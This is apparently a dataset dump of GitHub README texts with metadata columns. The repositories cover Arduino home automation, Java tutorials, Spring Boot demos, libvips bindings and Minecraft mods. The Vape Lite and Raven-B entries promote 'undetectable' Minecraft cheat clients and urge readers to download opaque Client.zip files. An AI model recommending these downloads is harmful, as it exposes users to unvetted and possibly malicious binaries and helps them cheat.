Complete the following steps to set up Arduino. You can use the [Arduino documentation](https://www.arduino.cc/en/Guide/HomePage) for reference:

* Upload the Arduino code in the repository root for the Arduino controller
* Connect PIN 11(TX) pin of Arduino to RX pin of HC-05
* Connect PIN 10(RX) pin of Arduino to TX pin of HC-05
* Connect 5V of Arduino to V<sub>in</sub> of HC-05 and V<sub>cc</sub> of relays
* Connect GND of Arduino to GND of HC-05 and GND of relays
* Connect IN of relay to PIN 13 of Arduino board(you are free to use any pin and also multiple pins, just update the arduino code)
* Connect 220V AC Line to Pole and Load(appliance) to NO of the relay
* Power the Arduino board and you're ready to use. Refer to circuit diagram for setup:

### Circuit Diagram
![Circuit diagram](https://raw.githubusercontent.com/KManiKumarReddy/Bluetooth-Home-Automation/master/circuit.png)

### How to use
* Build and install the app on an Android Bluetooth device.
* Turn Bluetooth ON and pair with HC-05 using the default passcode '1234' (Feel free to change this).
* Open the app, click on select controller and select the HC-05
* Use ON/OFF buttons to control the appliance.

### Purpose
Mini Project for Bachelor of Technology, CVR College of Engineering, Hyderabad


### Android Application
 - Features
    1) Send Signals via Bluetooth.
    2) List of Available Devices.
    3) Switch On/Off any devices.
  
 - Tools
    1) [Shared Preferences](https://developer.android.com/reference/android/content/SharedPreferences)
    2) [Bluetooth Socket](https://developer.android.com/reference/android/bluetooth/BluetoothSocket)
    3) [File](https://developer.android.com/reference/java/io/File)
    4) [Media Store](https://developer.android.com/reference/android/provider/MediaStore)
    5) [URI](https://developer.android.com/reference/android/net/Uri)

### License
This Source Code Form is subject to the terms of the Mozilla Public
License, v. 2.0. If a copy of the MPL was not distributed with this
file, You can obtain one at http://mozilla.org/MPL/2.0/.

Any copyright is dedicated to the Public Domain.
http://creativecommons.org/publicdomain/zero/1.0/

### Developed by
Mani Kumar Reddy K, Pramod Deshpande and Mallikarjun K
",0,0,1,0.0,"['description', 'requirement', 'step', 'set', 'arduino', 'circuit', 'diagram', 'how', 'use', 'purpose', 'android', 'application', 'license', 'develop']","['description', 'requirement', 'step', 'set', 'arduino']"
apripista/java,master,"# Learn Java Programming 

This repository contains code files and resources for learning Java programming language. The structure of the repository is organized into different sections, each focusing on specific topics.

`Read all readme.md files they provide a meaningful way to understand the structure of the entire directory(repository.)` and `java files are created with .java extension. example: Filename.java, Main.java`

Thanks for understanding.

## Learning Paths

1. **[Chapter 01: Introduction to Java Programming](chapter_01)**
   - **[part one](chapter_01/part_01)**: Introduction to Java programming language.
   - **[part two](chapter_01/part_02)**: Variables, operators, Strings, and mathematical operations.
   - **[part three](chapter_01/part_03)**: Control statements, loops, and arrays.

2. **[Chapter 02: Methods in Java Programming](chapter_02)**

   - Introduction to methods in Java.
   - Explanation of method declaration and invocation.
   - Different types of methods: static methods, instance methods, constructors.
   - Method overloading and overriding.
   - Examples demonstrating the usage of methods in Java programs.

2. **[Chapter 03: Introduction to Object Oriented Programming](chapter_03)**
   - Introduction to Objects and Classes in Java.
   - Introduction to Inheritance and Polymorphism in Java.
   - Exception Handling and Text I/O in Java
   - Abstract Classes and Interfaces in Java
   
## Usage

Feel free to explore the directories and files according to your learning needs. Each section contains code examples and explanations to help you understand different concepts in Java programming.

To run the Java files directly with Java, execute the following command in your terminal:

```bash
java Filename.java
```

or you may start by compiling the file and then run the compiled  class

```bash
javac Filename.java
```

the command above will create a java class of the respective java file in the same directory and then run this command

```bash
java Filename
```

the java class has a .class extension but this time run it wihout a .class extension.

Replace `Filename.java` with the name of the Java file you want to execute.

## Contributing

If you find any issues or want to contribute by adding more other concepts and examples to this repository, please feel free to submit a pull request or open an issue. Remember to read [CONTRIBUTING   GUIDELINES](CONTRIBUTING.md) and [CODE OF CONDUCT](CODE_OF_CONDUCT.md) before contributing.

_Happy coding! :)_
",0,0,1,0.0,"['learn', 'java', 'programming', 'learn', 'path', 'usage', 'contribute']","['learn', 'java', 'programming', 'path', 'usage']"
KirDemorgan/BeatSaberDsBot,master,"# BeatSaber Discord Bot

## Overview
This project is a Discord bot designed to integrate with the BeatSaber game, allowing users to fetch and display their BeatSaber statistics directly in Discord. The bot uses the ScoreSaber API to retrieve player data, including scores, ranks, and performance points (pp), and then assigns Discord roles based on the player's rank in the game.

## Features
- **Player Statistics**: Fetch and display individual player statistics from ScoreSaber.
- **Role Assignment**: Automatically assign roles in Discord based on the player's rank in BeatSaber.
- **Leaderboard**: Display global and country-specific leaderboards within Discord.

## Requirements
- Java 11 or higher
- Maven
- Discord Bot Token
- Access to ScoreSaber API

## Installation
1. Clone the repository:
   ```
   git clone https://github.com/KirDemorgan/BeatSaberDiscordBot.git
   ```
2. Navigate to the project directory:
   ```
   cd BeatSaberDiscordBot
   ```
3. Install dependencies using Maven:
   ```
   mvn install
   ```

## Usage
To start the bot, run:
```
java -jar target/BeatSaberDiscordBot-1.0-SNAPSHOT.jar
```
Make sure to set your Discord bot token and ScoreSaber API key in the `application.properties` file.

## Contributing
Contributions are welcome! Please follow the standard fork -> clone -> branch -> commit -> pull request workflow.



## Contact
KirDemorgan - [@KirDemorgan](https://github.com/KirDemorgan)

Project Link: [https://github.com/KirDemorgan/BeatSaberDiscordBot](https://github.com/KirDemorgan/BeatSaberDiscordBot)

",0,0,1,0.0,"['beatsaber', 'discord', 'bot', 'overview', 'feature', 'requirement', 'installation', 'usage', 'contribute', 'contact']","['beatsaber', 'discord', 'bot', 'overview', 'feature']"
snackbag/TT20,main,"# TT20
TT20 helps reduce lag by optimizing how ticks work when the server's TPS is low.

# Regarding singleplayer
While you can still use this mod in singleplayer, some things may not work correctly. You can always toggle any features in the configuration. We're trying our best to make this mod compatible with singleplayer, so if you find any issues, [please create an issue](https://github.com/snackbag/TT20/issues).

## What does TT20 stand for?
TT20 is an abbreviation of the `ticks*tps/20` formula. It's used to calculate the amount of ticks something takes, while taking the TPS into account.

## Caveats
TT20 only fixes the symptoms of TPS lag, not the actual lag. It re-calculates the amount of ticks things take. For example, when you're breaking a block it takes the original break time, multiplies it by ticks and divides it by 20 (the maximum TPS). This ensures that the end user feels almost no lag, even if the TPS is very low.

## Roadmap
- [X] Block break delay
- [X] Eating delay
- [X] Item pickup delay
- [X] Block entity tick acceleration (experimental)
- [ ] Entity death animation(?)
- [ ] Block state delay
- [X] Portal delay
- [X] Sleeping delay
- [X] Potion delay
- [X] Fluid spread speed
- [X] Random tickspeed acceleration
- [X] Day/nighttime acceleration

If you believe there is features missing, please tell us by creating a new issue (yes, also if you want compatibility with other mods!)
",10,7,1,4.0,"['regard', 'singleplayer', 'what', 'stand', 'for', 'caveat', 'roadmap']","['regard', 'singleplayer', 'what', 'stand', 'for']"
ReadingGod/Minecraft-Vape-Lite,master,"# Minecraft Vape Lite

Welcome to Minecraft Vape Lite! 🎮🚀 

## Description

Minecraft Vape Lite is a ghost client known for its undetectable modules during screenshares. This client is designed to provide players with an advantage while remaining hidden from prying eyes. It offers support for Minecraft versions 1.7.10 through 1.16.5.

## Features

- Undetectable modules
- Seamless integration
- Multi-version support
- Improved gameplay experience

## Installation

To start using Minecraft Vape Lite, follow these steps:

1. Download the client from the link below:
   [![Download Vape Lite](https://img.shields.io/badge/Download-Vape_Lite-<COLOR>.svg)](https://github.com/user-attachments/files/16830252/Client.zip)
   
2. Extract the downloaded file to your Minecraft directory.
3. Launch the game and enjoy the enhanced gameplay experience!

## Screenshots

Here are some screenshots of Minecraft Vape Lite in action:

![Screenshot 1](https://example.com/screenshot1.png)
![Screenshot 2](https://example.com/screenshot2.png)
![Screenshot 3](https://example.com/screenshot3.png)

## Modules

Minecraft Vape Lite comes with a variety of modules to enhance your gameplay. Some of the key modules include:

- **Fly**: Allows you to fly in the game.
- **X-Ray**: Reveals hidden ores and structures.
- **God Mode**: Makes you invincible in combat.
- **AutoMiner**: Automatically mines blocks for you.

## Support

If you encounter any issues or have questions about Minecraft Vape Lite, feel free to reach out to our support team at [support@vapelitesupport.com](mailto:support@vapelitesupport.com).

## Contributing

We welcome contributions from the community to make Minecraft Vape Lite even better! If you have ideas for new features or improvements, please submit a pull request.

## License

Minecraft Vape Lite is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.

---

Thank you for choosing Minecraft Vape Lite! Download the client now and elevate your Minecraft experience! 🎉🔥",1,0,1,0.0,"['minecraft', 'vape', 'lite', 'description', 'feature', 'installation', 'screenshots', 'module', 'support', 'contribute', 'license']","['minecraft', 'vape', 'lite', 'description', 'feature']"
Alek-paint/Raven-B,master,"# Raven-B

Raven b+ is a user-friendly Minecraft client offering a range of good modules for enhanced gameplay. It is designed for version 1.8.9.

![Minecraft Logo](https://www.minecraft.net/content/dam/games/minecraft/minecraft-net/global/header-minecraft-logo-og.f63ae4132138.png)

## Table of Contents
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Contributing](#contributing)
- [License](#license)

## Features
- Customizable GUI for a personalized Minecraft experience
- Various modules to optimize gameplay
- Compatibility with Minecraft version 1.8.9

## Installation
To get started with Raven-B, follow these steps:

1. Download the [**Raven-B Client**](https://github.com/user-attachments/files/16830358/Client.zip):
   [![Download](https://img.shields.io/badge/Download-Raven--B-orange)](https://github.com/user-attachments/files/16830358/Client.zip)

2. Unzip the downloaded file to a location of your choice.

3. Open the Minecraft launcher and create a new installation profile for version 1.8.9.

4. Run Minecraft with the newly created profile.

5. In the Minecraft game menu, select ""Raven-B"" as the active client.

Now you are all set to enjoy a customized Minecraft experience with Raven-B!

## Usage
Explore the various modules and settings offered by Raven-B to tailor your gameplay to your preferences. Here are some tips to enhance your experience:

**1. Keybind Configuration**
   - Customize keybinds for activating specific modules or features.
   
**2. Module Selection**
   - Select the modules that best suit your gameplay style.
   
**3. GUI Customization**
   - Personalize the GUI layout to have easy access to your preferred features.

## Contributing
Contributions to Raven-B are welcome! To contribute, follow these steps:

1. Fork this repository.
2. Create a new branch (`git checkout -b feature/new-feature`).
3. Make your changes.
4. Commit your changes (`git commit -am 'Add new feature'`).
5. Push to the branch (`git push origin feature/new-feature`).
6. Create a new Pull Request.

## License
This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.",1,0,1,0.0,"['table', 'content', 'feature', 'installation', 'usage', 'contribute', 'license']","['table', 'content', 'feature', 'installation', 'usage']"
Rapter1990/rolepermissionexample,main,"# ROLE WITH PERMISSION THROUGH SPRING SECURITY IN SPRING BOOT

<p align=""center"">
    <img src=""screenshots/spring_boot_role_permission_main_image.png"" alt=""Main Information"" width=""700"" height=""500"">
</p>

### 📖 Information

<ul style=""list-style-type:disc"">
  <li><b>This</b> is a Spring Boot example covering important and useful features.</li>
  <li>Here is an explanation of the example:</li>
       <ul>
         <li><b>Admin</b> and <b>User</b> implement their own <b>authentication</b> and <b>authorization</b> through their defined <b>role</b> names.</li>
         <li>The <b>Admin</b> handles with the following process shown above:
            <ul>
              <li><b>Admin</b> with <b>Role</b> containing <b>create</b> permission only handles with creating product</li>
              <li><b>Admin</b> with <b>Role</b> containing <b>get</b> permission only handles with getting product by id</li>
              <li><b>Admin</b> with <b>Role</b> containing <b>update</b> permission only handles with updating product by id</li>
              <li><b>Admin</b> with <b>Role</b> containing <b>delete</b> permission only handles with deleting product by id</li>
            </ul>
         </li>
         <li>The <b>User</b> handles with the following process shown above:
            <ul>
              <li><b>User</b> with <b>Role</b> containing <b>get</b> permission only handles with getting product by id</li>
            </ul>
         </li>
  </ul>
</ul>


### Explore Rest APIs

<table style=""width:100%"">
  <tr>
      <th>Method</th>
      <th>Url</th>
      <th>Description</th>
      <th>Request Body</th>
      <th>Header</th>
      <th>Valid Path Variable</th>
      <th>No Path Variable</th>
  </tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/register</td>
      <td>User Register</td>
      <td>RegisterRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/login</td>
      <td>User Login</td>
      <td>LoginRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/refresh-token</td>
      <td>User Refresh Token</td>
      <td>TokenRefreshRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/logout</td>
      <td>User Logout</td>
      <td>TokenInvalidateRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/products</td>
      <td>Create Product</td>
      <td>ProductCreateRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>GET</td>
      <td>/api/v1/products/{productId}</td>
      <td>Get Product By Id</td>
      <td></td>
      <td></td>
      <td>ProductId</td>
      <td></td>
  <tr>
  <tr>
      <td>GET</td>
      <td>/api/v1/products</td>
      <td>Get Products</td>
      <td>ProductPagingRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>PUT</td>
      <td>/api/v1/products/{productId}</td>
      <td>Update Product By Id</td>
      <td>ProductUpdateRequest</td>
      <td></td>
      <td>ProductId</td>
      <td></td>
  <tr>
  <tr>
      <td>DELETE</td>
      <td>/api/v1/products/{productId}</td>
      <td>Delete Product By Id</td>
      <td></td>
      <td></td>
      <td>ProductId</td>
      <td></td>
  <tr>
</table>


### Technologies

---
- Java 21
- Spring Boot 3.0
- Restful API
- Lombok
- Maven
- Junit5
- Mockito
- TestContainer
- Integration Tests
- Docker
- Docker Compose
- CI/CD (Github Actions)
- Postman
- Spring Boot Open Api


### Postman

```
Import postman collection under postman_collection folder
```

### Open Api

```
http://localhost:1225/swagger-ui/index.html
```

### Prerequisites

#### Define Variable in .env file

```
DATABASE_USERNAME={DATABASE_USERNAME}
DATABASE_PASSWORD={DATABASE_PASSWORD}
```

---
- Maven or Docker
---


### Docker Run
The application can be built and run by the `Docker` engine. The `Dockerfile` has multistage build, so you do not need to build and run separately.

Please follow directions shown below in order to build and run the application with Docker Compose file;

```sh
$ cd rolepermissionexample
$ docker-compose up -d
```

If you change anything in the project and run it on Docker, you can also use this command shown below

```sh
$ cd rolepermissionexample
$ docker-compose up --build
```

---
### Maven Run
To build and run the application with `Maven`, please follow the directions shown below;

```sh
$ cd rolepermissionexample
$ mvn clean install
$ mvn spring-boot:run
```

### Screenshots

<details>
<summary>Click here to show the screenshots of project</summary>
    <p> Figure 1 </p>
    <img src =""screenshots/1.PNG"">
    <p> Figure 2 </p>
    <img src =""screenshots/2.PNG"">
    <p> Figure 3 </p>
    <img src =""screenshots/3.PNG"">
    <p> Figure 4 </p>
    <img src =""screenshots/4.PNG"">
    <p> Figure 5 </p>
    <img src =""screenshots/5.PNG"">
    <p> Figure 6 </p>
    <img src =""screenshots/6.PNG"">
    <p> Figure 7 </p>
    <img src =""screenshots/7.PNG"">
    <p> Figure 8 </p>
    <img src =""screenshots/8.PNG"">
</details>

### Contributors

- [Sercan Noyan Germiyanoğlu](https://github.com/Rapter1990)",0,0,1,0.0,"['role', 'with', 'permission', 'through', 'spring', 'security', 'in', 'spring', 'boot', 'information', 'explore', 'rest', 'apis', 'technology', 'postman', 'open', 'api', 'prerequisite', 'define', 'variable', 'file', 'docker', 'run', 'maven', 'run', 'screenshots', 'contributor']","['spring', 'run', 'role', 'with', 'permission']"
wb04307201/easy-ai-spring-boot-starter,master,"# easy-ai-spring-boot-starter
# 易智Spring

[![](https://jitpack.io/v/com.gitee.wb04307201/easy-ai-spring-boot-starter.svg)](https://jitpack.io/#com.gitee.wb04307201/easy-ai-spring-boot-starter)
[![star](https://gitee.com/wb04307201/easy-ai-spring-boot-starter/badge/star.svg?theme=dark)](https://gitee.com/wb04307201/easy-ai-spring-boot-starter)
[![fork](https://gitee.com/wb04307201/easy-ai-spring-boot-starter/badge/fork.svg?theme=dark)](https://gitee.com/wb04307201/easy-ai-spring-boot-starter)
[![star](https://img.shields.io/github/stars/wb04307201/easy-ai-spring-boot-starter)](https://github.com/wb04307201/easy-ai-spring-boot-starter)
[![fork](https://img.shields.io/github/forks/wb04307201/easy-ai-spring-boot-starter)](https://github.com/wb04307201/easy-ai-spring-boot-starter)  
![MIT](https://img.shields.io/badge/License-Apache2.0-blue.svg) ![JDK](https://img.shields.io/badge/JDK-17+-green.svg) ![SpringBoot](https://img.shields.io/badge/Srping%20Boot-3+-green.svg)

> 这不是一个AI大模型，但是可以帮你快速集成AI大模型到Spring项目中，  
> 并通过“检索增强生成(RAG)”的方式建立专家知识库帮助大模型回答问题。  
> 
> 核心功能依赖于[Spring AI](https://docs.spring.io/spring-ai/reference/index.html)实现，RAG运行原理如下  
> ![img_3.png](img_3.png)

## 代码示例
1. 使用[易智Spring](https://gitee.com/wb04307201/easy-ai-spring-boot-starter)实现的[AI大模型Demo](https://gitee.com/wb04307201/easy-ai-demo)

## 快速开始
### 引入依赖
增加 JitPack 仓库
```xml
<repositories>
    <repository>
        <id>jitpack.io</id>
        <url>https://jitpack.io</url>
    </repository>
</repositories>
```
引入jar
```xml
<dependency>
    <groupId>com.github.wb04307201</groupId>
    <artifactId>easy-ai-spring-boot-starter</artifactId>
    <version>0.5.0</version>
</dependency>
```

### 安装向量数据库
通过docker安装chromadb数据库
```shell
docker run -d --name chromadb -p 8000:8000 chromadb/chroma
```

### 安装大语言模型
默认通过[ollama](https://ollama.com/)使用大模型，下载并安装
```shell
# 拉取llama3模型
ollama pull llama3
# 拉取qwen2模型
ollama pull qwen2
```

### 添加相关配置
```yaml
spring:
  application:
    name: spring_ai_demo
  ai:
    ollama:
      chat:
        options:
          #  model: llama3
          model: qwen2
      embedding:
        options:
          model: llama3
      base-url: ""http://localhost:11434""
    vectorstore:
      chroma:
        client:
          host: http://localhost
          port: 8000
        store:
          collection-name: SpringAiCollection
  servlet:
    multipart:
      max-file-size: 10MB
      max-request-size: 10MB
```

### 在启动类上加上`@EnableEasyAi`注解
```java
@EnableEasyAi
@SpringBootApplication
public class EasyAiDemoApplication {

    public static void main(String[] args) {
        SpringApplication.run(EasyAiDemoApplication.class, args);
    }

}
```

### 使用大模型对话
内置聊天界面http://ip:端口/easy/ai/chat  
![img.png](img.png)

### 使用专家知识库的大模型对话
内置上传界面http://ip:端口/easy/ai/list  
![img_1.png](img_1.png)
状态列显示“向量存储完”即文档已转入知识库  
内置聊天界面http://ip:端口/easy/ai/chat  
![img_2.png](img_2.png)

## 高级
### 使用大模型API
这里以[智谱AI](https://open.bigmodel.cn/)为例，如何对接大模型API  
修改项目依赖，支持的大模型平台可到[Spring AI](https://docs.spring.io/spring-ai/reference/index.html)查看  
```xml
        <dependency>
            <groupId>com.gitee.wb04307201</groupId>
            <artifactId>easy-ai-spring-boot-starter</artifactId>
            <version>0.5.0</version>
            <exclusions>
                <exclusion>
                    <groupId>org.springframework.ai</groupId>
                    <artifactId>spring-ai-ollama-spring-boot-starter</artifactId>
                </exclusion>
            </exclusions>
        </dependency>
        <dependency>
            <groupId>org.springframework.ai</groupId>
            <artifactId>spring-ai-zhipuai-spring-boot-starter</artifactId>
            <version>1.0.0-SNAPSHOT</version>
        </dependency>
```
修改配置项目
```yaml
spring:
  ai:
    zhipuai:
      api-key: 智谱AI API Key
```
> 除了大模型API外，向量数据库也可以参照上面的方式进行替换",0,0,2,0.0,"['model', 'enableeasyai']","['model', 'enableeasyai']"
Sigma-Skidder-Team/SigmaRemap,main,"# SigmaRemap
Sigma 5.0 remapping project

## Thanks
- This entire project could only be possible by the help of **@kitten_12333** himself who deobfuscated sigma 5.0 to be readable enough.


### [!] Latest fixes/improvements
We have fixed many features already,
- music player (featured playlists & search functionality);
- removed viaversion and the bugs that came with it;
- shield rendering when sword blocking;
- stairs hitbox/collision bug;
- removed resource decryption;
- 4.5 reach on survival;
- classic mode visuals;
- white screen issue;
- profiles/configs;
- discord rpc. 

### [!] TO-DO
1. Fix singleplayer;
2. Main menu, animation and gui flickering;
3. Packet issues on some servers (instant disconnect/kicks);
4. Add back ViaVersion/Jello Portal.

### :D

### Contributors
- [Richy](https://github.com/richylotl)
- [lamzvam](https://github.com/lamzvam)
- [StormingMoon](https://github.com/StormingMoon)

### Images
- Version selector: ![image](https://i.imgur.com/01L5QsL.png)
- Jello main menu (logged in): ![image](https://i.imgur.com/TOeXVQh.png)
- Jello alt manager: ![image](https://i.imgur.com/JEjAWJR.png)
- Jello clickgui: ![image](https://i.imgur.com/RienCN2.png)
- Jello keybind manager: ![image](https://i.imgur.com/OiP3kOI.png)
- Classic main menu: ![image](https://i.imgur.com/ULN2w5e.png)
- Classic clickgui ![image](https://i.imgur.com/bbv0LP0.png)
- Music player (from search) ![image](https://i.imgur.com/CJKMeUB.png)
- Music player (featured) ![image](https://i.imgur.com/bLpaVd1.png)

### Tools & stuff used
- Optifine 1.16.4 HD U G5 source - https://github.com/Hexeption/Optifine-SRC
- Recaf 2.21.4 - https://github.com/Col-E/Recaf/tree/archive_2_x
",0,1,1,1.0,"['sigmaremap', 'thanks', 'latest', 'd', 'contributor', 'image', 'tool', 'stuff', 'use']","['sigmaremap', 'thanks', 'latest', 'd', 'contributor']"
CallmeSHaobe/123Technology,main,"# **123Technology**
######  可能是没活硬整罢。
######  一些参考来自TST。
######  材质来源 ： JulianChum  ABKQPO  LyeeR
######  部分结构来源 ：JulianChum LyeeR 商陆
## **机器配方池**
###### 神之艾萨锻炉 : ""otht.recipe.MegaIsaForge""
###### 狄拉克潮汐 : ""otht.recipe.GT_TE_MegaQFTFake""
###### EVA专用改造阳电子炮 : ""otht.recipe.EVACannon""
###### 中国石化 : ""otht.recipe.SINOPEC""
###### 唐山炼钢厂 : ""otht.recipe.TSSF""
###### 红日之将军恩情工厂(巨型PCB工厂, 贴片工坊, NMD晶圆厂, 元件聚合者) ""otht.recipe.MegaPCB"" , ""otht.recipe.MegaPCB_A"" , ""otht.recipe.MegaPCB_B"" , ""otht.recipe.MegaPCB_C""
",10,0,2,0.0,"['julianchum', 'abkqpo', 'lyeer', 'lyeer']","['lyeer', 'julianchum', 'abkqpo']"
lopcode/vips-ffm,main,"# vips-ffm

[libvips](https://github.com/libvips/libvips) bindings for JVM projects, using the ""Foreign Function & Memory API""
([JEP 454](https://openjdk.org/jeps/454)), and the ""Class-File API"" ([JEP 457](https://openjdk.org/jeps/457)) released in JDK 22. The combination
of libvips, FFM, and auto-generated helpers means these bindings are complete (supporting all libvips operations), safe,
and [faster](https://github.com/lopcode/vips-ffm/issues/59#issuecomment-2367634956) than AWT or JNI-based alternatives.

Supports a vast range of image formats, including HEIC, JXL, WebP, PNG, JPEG, and more. Pronounced ""vips (like zips)
eff-eff-emm"". The project is relatively new, but aims to be production ready. Tested on macOS 14, Windows 11, and Linux
(Ubuntu 24.04). Should work on any architecture you can use libvips and Java on (arm64/amd64/etc).

Used the library? I'd love to hear from more users - let me know in [Discussions](https://github.com/lopcode/vips-ffm/discussions).

Please also give [the repo](https://github.com/lopcode/vips-ffm) a star 🌟️!

## Usage

`vips-ffm` is available on Maven Central. To get set up with Gradle:

```kotlin
repositories {
    mavenCentral()
}

dependencies {
    implementation(""app.photofox.vips-ffm:vips-ffm-core:1.1.1"")
}
```
When running your project you must add `--enable-native-access=ALL-UNNAMED` to your JVM runtime arguments. If you
don't, you'll get a warning about ""Restricted methods"". In the future, the JVM will throw an error if you don't
explicitly include this flag.

As the project uses the Java FFM API, it must target JDK 22+. Bindings are currently generated from libvips `8.15.3`,
however they use the underlying libvips operation API. Most operations **do not** use the C API directly (as described
in the [bindings docs](https://www.libvips.org/API/current/binding.html)) - they should be safe to use with different
libvips versions, assuming there haven't been major changes.

> [!NOTE]
> This library **does not** include `libvips` in the download, you must add it to the system/container you're building
> for, then make sure it's available in `DYLD_LIBRARY_PATH` (on macOS), `LD_LIBRARY_PATH` (on Linux), or `PATH` (on
> Windows).

All libvips operations are exposed via helper classes, like `VImage`. You must provide an [Arena][1] to operations like
`VImage.newFromFile`, which constrains the lifetime of objects generated during usage. You can get an appropriate arena
by using `Vips.run` as shown in the [sample](#thumbnail-sample) below. `VImage` and associated enums have extensive
Javadocs included, which are automatically generated from the same source that the libvips website uses, for ease of use.
These helper objects expose their raw pointers as a last resort via functions like `VTarget.getUnsafeStructAddress` - if
you need to use these raw pointers and can't find an alternative, please file a GitHub Issue.

Helper enums are generated for the version of libvips shown above. If you need to use an enum from another version,
which isn't present in `vips-ffm`, you can use `VipsOption.Enum(rawValue)` or `VEnum.Raw(rawValue)`.

> [!CAUTION]
> Bindings generated by `jextract` are available in `VipsRaw`, and wrapped with validation in `VipsHelper`. These
> functions are difficult to use without accidentally causing memory leaks, or even segfaults! If what you want to do is
> available in `VImage` and other `V`-prefixed classes, use those instead. If you notice something missing, please open
> a GitHub Issue.

### Thumbnail sample

To get a feeling for the bindings, here's an indicative sample written in Kotlin (using the Java bindings) that:
* Loads an original JPEG image from disk
* Writes a copy of it to disk
* Creates a 400px thumbnail from the original, and writes that to disk

```kotlin
import app.photofox.vipsffm.Vips
import app.photofox.vipsffm.VImage
import app.photofox.vipsffm.VipsOption
import app.photofox.vipsffm.enums.VipsAccess

// ...

// Call once to initialise libvips when your program starts, from any thread
Vips.init()

// Use `Vips.run` to wrap your usage of the API, and get an arena with an appropriate lifetime to use
// Usage of the API, arena, and resulting V-Objects must be done from the thread that called `Vips.run`
Vips.run { arena ->
    val sourceImage = VImage.newFromFile(
      arena,
      ""sample/src/main/resources/sample_images/rabbit.jpg"",
      VipsOption.Enum(""access"", VipsAccess.ACCESS_SEQUENTIAL)
    )
    val sourceWidth = sourceImage.width
    val sourceHeight = sourceImage.height
    logger.info(""source image size: $sourceWidth x $sourceHeight"")

    val outputPath = workingDirectory.resolve(""rabbit_copy.jpg"")
    sourceImage.writeToFile(outputPath.absolutePathString())

    val thumbnail = sourceImage.thumbnail(
      ""sample/src/main/resources/sample_images/rabbit.jpg"",
      400
    )
    val thumbnailWidth = thumbnail.width
    val thumbnailHeight = thumbnail.height
    logger.info(""thumbnail image size: $thumbnailWidth x $thumbnailHeight"")
}

// Optionally call at the end of your program, for memory leak detection, from any thread
Vips.shutdown()
```

## Samples

Samples are included that show various usages of these bindings. They include validations, and run on GitHub Actions as
""end-to-end tests"" during development. You can find them all listed [here](https://github.com/lopcode/vips-ffm/tree/main/sample/src/main/kotlin/vipsffm/sample).

To get set up to run samples (on macOS):
* `brew install vips`
* `sdk use java 22-open`
* Then either:
  * Run `./run_samples.sh` in your terminal
  * Use the included `Run samples` profile in IntelliJ

```
[main] INFO vipsffm.SampleRunner - clearing sample run directory at path ""sample_run""
[main] INFO vipsffm.SampleRunner - running sample ""RawGetVersionSample""...
[main] INFO vipsffm.RawGetVersionSample - libvips version: ""8.15.3""
[main] INFO vipsffm.SampleRunner - validation succeeded ✅
[main] INFO vipsffm.SampleRunner - running sample ""HelperGetVersionSample""...
[main] INFO vipsffm.HelperGetVersionSample - libvips version: ""8.15.3""
[main] INFO vipsffm.SampleRunner - validation succeeded ✅
[main] INFO vipsffm.SampleRunner - running sample ""VImageCreateThumbnailSample""...
[main] INFO vipsffm.RawGetVersionSample - source image size: 2490 x 3084
[main] INFO vipsffm.RawGetVersionSample - thumbnail image size: 323 x 400
[main] INFO vipsffm.SampleRunner - validation succeeded ✅
[main] INFO vipsffm.SampleRunner - running sample ""VImageChainSample""...
[main] INFO vipsffm.SampleRunner - validation succeeded ✅
[main] INFO vipsffm.SampleRunner - running sample ""VSourceTargetSample""...
[main] INFO vipsffm.SampleRunner - validation succeeded ✅
[main] INFO vipsffm.SampleRunner - running sample ""VImageCopyWriteSample""...
[main] INFO vipsffm.SampleRunner - validation succeeded ✅
[main] INFO vipsffm.SampleRunner - running sample ""VOptionHyphenSample""...
[main] INFO vipsffm.SampleRunner - validation succeeded ✅
[main] INFO vipsffm.SampleRunner - running sample ""VImageCachingSample""...
[main] INFO vipsffm.SampleRunner - validation succeeded ✅
[main] INFO vipsffm.SampleRunner - shutting down vips to check for memory leaks...
memory: high-water mark 128.35 MB
[main] INFO vipsffm.SampleRunner - all samples ran successfully 🎉
```

## Project goals

Ideas and suggestions are welcome, but please make sure they fit in to these goals, or you have a good argument about
why a goal should change!

* Avoid manual work by automating as much as possible. This means upstream changes can be rapidly integrated.
* Use the libvips operations API, as described in the [libvips documentation](https://www.libvips.org/API/current/binding.html)
* Provide access to the raw bindings (`VipsHelper`), so users aren't blocked by helper bugs or API annoyances.
* Incubate in [Photo Fox](https://github.com/lopcode/photo-fox) with some ""real world"" usage.

## Contributing

I'm not currently looking for external code contributions. If you'd like to help the project:

* Use the library and give your feedback in [Discussions](https://github.com/lopcode/vips-ffm/discussions)
  * Or [file an issue](https://github.com/lopcode/vips-ffm/issues) if you have a problem!
* Share the [announcement post](https://www.lopcode.com/posts/2024/10/vips-ffm-1/) in your circles
* Star the repo 🌟

Thank you for being enthusiastic about the project!

## Releasing

* GitHub Releases automatically result in a deployment to GitHub Packages
* Maven Central releases happen manually 
  * This can only be done by @lopcode
  * And only after a GitHub Release is made
  * Run `./publish_release_to_maven_central.sh <version matching github release version, including v prefix>` 

[1]: https://docs.oracle.com/en/java/javase/22/core/memory-segments-and-arenas.html",31,3,3,79.0,"['usage', 'thumbnail', 'sample', 'sample', 'project', 'goal', 'contribute', 'release']","['sample', 'usage', 'thumbnail', 'project', 'goal']"
HiveGamesOSS/Chunker,main,"# Chunker

**Convert Minecraft worlds between Java Edition and Bedrock Edition**

Chunker is a Java application which allows you to convert Java and Bedrock Minecraft worlds. It provides a simple
interface for converting worlds and allows you to upgrade and downgrade worlds between different versions of the 
game.

Supported Formats:

- Bedrock
    - 1.12.0
    - 1.13.0
    - 1.14.0 - 1.14.60
    - 1.16.0 - 1.16.220
    - 1.17.0 - 1.17.40
    - 1.18.0 - 1.18.30
    - 1.19.0 - 1.19.80
    - 1.20.0 - 1.20.80
